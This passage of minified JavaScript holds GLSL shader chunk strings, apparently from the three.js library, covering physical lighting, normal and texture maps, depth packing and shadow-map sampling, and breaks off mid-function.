geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNL = saturate( dot( geometry.clearcoatNormal, directLight.direction ) );\n\t\tvec3 ccIrradiance = ccDotNL * directLight.color;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tccIrradiance *= PI;\n\t\t#endif\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t\treflectedLight.directSpecular += ccIrradiance * material.clearcoat * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\t#ifdef USE_SHEEN\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_Sheen(\n\t\t\tmaterial.specularRoughness,\n\t\t\tdirectLight.direction,\n\t\t\tgeometry,\n\t\t\tmaterial.sheenColor\n\t\t);\n\t#else\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.normal, material.specularColor, material.specularRoughness);\n\t#endif\n\treflectedLight.directDiffuse += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNV = saturate( dot( geometry.clearcoatNormal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular += clearcoatRadiance * material.clearcoat * BRDF_Specular_GGX_Environment( geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t\tfloat ccDotNL = ccDotNV;\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\tfloat clearcoatInv = 1.0 - clearcoatDHR;\n\tvec3 singleScattering = vec3( 0.0 );\n\tvec3 multiScattering = vec3( 0.0 );\n\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\tBRDF_Specular_Multiscattering_Environment( geometry, material.specularColor, material.specularRoughness, singleScattering, multiScattering );\n\tvec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\treflectedLight.indirectSpecular += clearcoatInv * radiance * singleScattering;\n\treflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;\n\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n}\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n}",lights_fragment_begin:"\nGeometricContext geometry;\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = normalize( vViewPosition );\n#ifdef CLEARCOAT\n\tgeometry.clearcoatNormal = clearcoatNormal;\n#endif\nIncidentLight directLight;\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\tPointLight pointLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec3( pointLight.shadow, directLight.visible, receiveShadow ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\tSpotLight spotLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec3( spotLight.shadow, directLight.visible, receiveShadow ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\tDirectionalLight directionalLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec3( directionalLight.shadow, directLight.visible, receiveShadow ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\tRectAreaLight rectAreaLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if defined( RE_IndirectDiffuse )\n\tvec3 iblIrradiance = vec3( 0.0 );\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\tirradiance += getLightProbeIrradiance( lightProbe, geometry );\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\t\t#pragma unroll_loop\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t}\n\t#endif\n#endif\n#if defined( RE_IndirectSpecular )\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearcoatRadiance = vec3( 0.0 );\n#endif",lights_fragment_maps:"#if defined( RE_IndirectDiffuse )\n\t#ifdef USE_LIGHTMAP\n\t\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tlightMapIrradiance *= PI;\n\t\t#endif\n\t\tirradiance += lightMapIrradiance;\n\t#endif\n\t#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )\n\t\tiblIrradiance += getLightProbeIndirectIrradiance( geometry, maxMipLevel );\n\t#endif\n#endif\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\tradiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.normal, material.specularRoughness, maxMipLevel );\n\t#ifdef CLEARCOAT\n\t\tclearcoatRadiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.clearcoatNormal, material.clearcoatRoughness, maxMipLevel );\n\t#endif\n#endif",lights_fragment_end:"#if defined( RE_IndirectDiffuse )\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n#endif\n#if defined( RE_IndirectSpecular )\n\tRE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometry, material, reflectedLight );\n#endif",logdepthbuf_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tgl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;\n#endif",logdepthbuf_pars_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n\tvarying float vIsPerspective;\n#endif",logdepthbuf_pars_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvarying float vFragDepth;\n\t\tvarying float vIsPerspective;\n\t#else\n\t\tuniform float logDepthBufFC;\n\t#endif\n#endif",logdepthbuf_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\t\tvIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );\n\t#else\n\t\tif ( isPerspectiveMatrix( projectionMatrix ) ) {\n\t\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\t\t\tgl_Position.z *= gl_Position.w;\n\t\t}\n\t#endif\n#endif",map_fragment:"#ifdef USE_MAP\n\tvec4 texelColor = texture2D( map, vUv );\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n#endif",map_pars_fragment:"#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif",map_particle_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n#endif\n#ifdef USE_MAP\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n#endif\n#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, uv ).g;\n#endif",map_particle_pars_fragment:"#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tuniform mat3 uvTransform;\n#endif\n#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif\n#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",metalnessmap_fragment:"float metalnessFactor = metalness;\n#ifdef USE_METALNESSMAP\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\tmetalnessFactor *= texelMetalness.b;\n#endif",metalnessmap_pars_fragment:"#ifdef USE_METALNESSMAP\n\tuniform sampler2D metalnessMap;\n#endif",morphnormal_vertex:"#ifdef USE_MORPHNORMALS\n\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\n\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\n\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\n\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\n#endif",morphtarget_pars_vertex:"#ifdef USE_MORPHTARGETS\n\t#ifndef USE_MORPHNORMALS\n\tuniform float morphTargetInfluences[ 8 ];\n\t#else\n\tuniform float morphTargetInfluences[ 4 ];\n\t#endif\n#endif",morphtarget_vertex:"#ifdef USE_MORPHTARGETS\n\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\n\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\n\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\n\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\n\t#ifndef USE_MORPHNORMALS\n\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\n\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\n\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\n\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\n\t#endif\n#endif",normal_fragment_begin:"#ifdef FLAT_SHADED\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n#else\n\tvec3 normal = normalize( vNormal );\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\t#ifdef USE_TANGENT\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\ttangent = tangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t\tbitangent = bitangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t#endif\n\t#endif\n#endif\nvec3 geometryNormal = normal;",normal_fragment_maps:"#ifdef OBJECTSPACE_NORMALMAP\n\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t#ifdef FLIP_SIDED\n\t\tnormal = - normal;\n\t#endif\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\tnormal = normalize( normalMatrix * normal );\n#elif defined( TANGENTSPACE_NORMALMAP )\n\t#ifdef USE_TANGENT\n\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy = normalScale * mapN.xy;\n\t\tnormal = normalize( vTBN * mapN );\n\t#else\n\t\tnormal = perturbNormal2Arb( -vViewPosition, normal, normalScale, normalMap );\n\t#endif\n#elif defined( USE_BUMPMAP )\n\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n#endif",normalmap_pars_fragment:"#ifdef USE_NORMALMAP\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n#endif\n#ifdef OBJECTSPACE_NORMALMAP\n\tuniform mat3 normalMatrix;\n#endif\n#if ! defined ( USE_TANGENT ) && ( defined ( TANGENTSPACE_NORMALMAP ) || defined ( USE_CLEARCOAT_NORMALMAP ) )\n\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm, vec2 normalScale, in sampler2D normalMap ) {\n\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\tvec2 st0 = dFdx( vUv.st );\n\t\tvec2 st1 = dFdy( vUv.st );\n\t\tfloat scale = sign( st1.t * st0.s - st0.t * st1.s );\n\t\tvec3 S = normalize( ( q0 * st1.t - q1 * st0.t ) * scale );\n\t\tvec3 T = normalize( ( - q0 * st1.s + q1 * st0.s ) * scale );\n\t\tvec3 N = normalize( surf_norm );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy *= normalScale;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tbool frontFacing = dot( cross( S, T ), N ) > 0.0;\n\t\t\tmapN.xy *= ( float( frontFacing ) * 2.0 - 1.0 );\n\t\t#else\n\t\t\tmapN.xy *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t#endif\n\t\tmat3 tsn = mat3( S, T, N );\n\t\treturn normalize( tsn * mapN );\n\t}\n#endif",clearcoat_normal_fragment_begin:"#ifdef CLEARCOAT\n\tvec3 clearcoatNormal = geometryNormal;\n#endif",clearcoat_normal_fragment_maps:"#ifdef USE_CLEARCOAT_NORMALMAP\n\t#ifdef USE_TANGENT\n\t\tmat3 vTBN = mat3( tangent, bitangent, clearcoatNormal );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy = clearcoatNormalScale * mapN.xy;\n\t\tclearcoatNormal = normalize( vTBN * mapN );\n\t#else\n\t\tclearcoatNormal = perturbNormal2Arb( - vViewPosition, clearcoatNormal, clearcoatNormalScale, clearcoatNormalMap );\n\t#endif\n#endif",clearcoat_normalmap_pars_fragment:"#ifdef USE_CLEARCOAT_NORMALMAP\n\tuniform sampler2D clearcoatNormalMap;\n\tuniform vec2 clearcoatNormalScale;\n#endif",packing:"vec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\nconst float ShiftRight8 = 1. / 256.;\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8;\treturn r * PackUpscale;\n}\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\nvec4 encodeHalfRGBA ( vec2 v ) {\n\tvec4 encoded = vec4( 0.0 );\n\tconst vec2 offset = vec2( 1.0 / 255.0, 0.0 );\n\tencoded.xy = vec2( v.x, fract( v.x * 255.0 ) );\n\tencoded.xy = encoded.xy - ( encoded.yy * offset );\n\tencoded.zw = vec2( v.y, fract( v.y * 255.0 ) );\n\tencoded.zw = encoded.zw - ( encoded.ww * offset );\n\treturn encoded;\n}\nvec2 decodeHalfRGBA( vec4 v ) {\n\treturn vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );\n}\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}",premultiplied_alpha_fragment:"#ifdef PREMULTIPLIED_ALPHA\n\tgl_FragColor.rgb *= gl_FragColor.a;\n#endif",project_vertex:"vec4 mvPosition = vec4( transformed, 1.0 );\n#ifdef USE_INSTANCING\n\tmvPosition = instanceMatrix * mvPosition;\n#endif\nmvPosition = modelViewMatrix * mvPosition;\ngl_Position = projectionMatrix * mvPosition;",dithering_fragment:"#ifdef DITHERING\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n#endif",dithering_pars_fragment:"#ifdef DITHERING\n\tvec3 dithering( vec3 color ) {\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\t\treturn color + dither_shift_RGB;\n\t}\n#endif",roughnessmap_fragment:"float roughnessFactor = roughness;\n#ifdef USE_ROUGHNESSMAP\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\troughnessFactor *= texelRoughness.g;\n#endif",roughnessmap_pars_fragment:"#ifdef USE_ROUGHNESSMAP\n\tuniform sampler2D roughnessMap;\n#endif",shadowmap_pars_fragment:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\t}\n\tvec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {\n\t\treturn decodeHalfRGBA( texture2D( shadow, uv ) );\n\t}\n\tfloat VSMShadow (sampler2D shadow, vec2 uv, float compare ){\n\t\tfloat occlusion = 1.0;\n\t\tvec2 distribution = texture2DDistribution( shadow, uv );\n\t\tfloat hard_shadow = step( compare , distribution.x );\n\t\tif (hard_shadow != 1.0 ) {\n\t\t\tfloat distance = compare - distribution.x ;\n\t\t\tfloat variance = max( 0.00000, distribution.y * distribution.y );\n\t\t\tfloat softness_probability = variance / (variance + distance * distance );\t\t\tsoftness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );\t\t\tocclusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );\n\t\t}\n\t\treturn occlusion;\n\t}\n\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\n\t\tconst vec2 offset = vec2( 0.0, 1.0 );\n\t\tvec2 texelSize = vec2( 1.0 ) / size;\n\t\tvec2 centroidUV = ( floor( uv * size - 0.5 ) + 0.5 ) * texelSize;\n\t\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\n\t\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\n\t\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\n\t\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\n\t\tvec2 f = fract( uv * size + 0.5 );\n\t\tfloat a = mix( lb, lt, f.y );\n\t\tfloat b = mix( rb, rt, f.y );\n\t\tfloat c = mix( a, b, f.x );\n\t\treturn c;\n\t}\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\t\tfloat shadow = 1.0;\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\t\tbool frustumTest = all( frustumTestVec );\n\t\tif ( frustumTest ) {\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tfloat dx2 = dx0 / 2.0;\n\t\t\tfloat dy2 = dy0 / 2.0;\n\t\t\tfloat dx3 = dx1 / 2.0;\n\t\t\tfloat dy3 = dy1 / 2.0;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 17.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_PCF_SOFT )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tshadow = (\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy, shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +\n\t\t\t\ttexture2DShadowLerp( shadowMap, shadowMapSize, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )\n\t\t\t) * ( 1.0 / 9.0 );\n\t\t#elif defined( SHADOWMAP_TYPE_VSM )\n\t\t\tshadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#else\n\t\t\tshadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );\n\t\t#endif\n\t\t}\n\t\treturn shadow;\n\t}\n\tvec2 cubeToUV( vec3 v, float texelSizeY ) {\n\t\tvec3 absV = abs( v );\n\t\tfloat scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );\n\t\tabsV *= scaleToCube;\n\t\tv *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );\n\t\tvec2 planar = v.xy;\n\t\tfloat almostATexel = 1.5 * texelSizeY;\n\t\tfloat almostOne = 1.0 - almostATexel;\n\t\tif ( absV.z >= almostOne ) {\n\t\t\tif ( v.z > 0.0 )\n\t\t\t\tplanar.x = 4.0 - v.x;\n\t\t} else if ( absV.x >= almostOne ) {\n\t\t\tfloat signX = sign( v.x );\n\t\t\tplanar.x = v.z * signX + 2.0 * signX;\n\t\t} else if ( absV.y >= almostOne ) {\n\t\t\tfloat signY = sign( v.y );\n\t\t\tplanar.x = v.x + 2.0 * signY + 2.0;\n\t\t\tplanar.y = v.z * signY - 2.0;\n\t\t}\n\t\treturn vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );\n\t}\n\tfloat getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {\n\t\tvec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );\n\t\tvec3 lightToPosition = 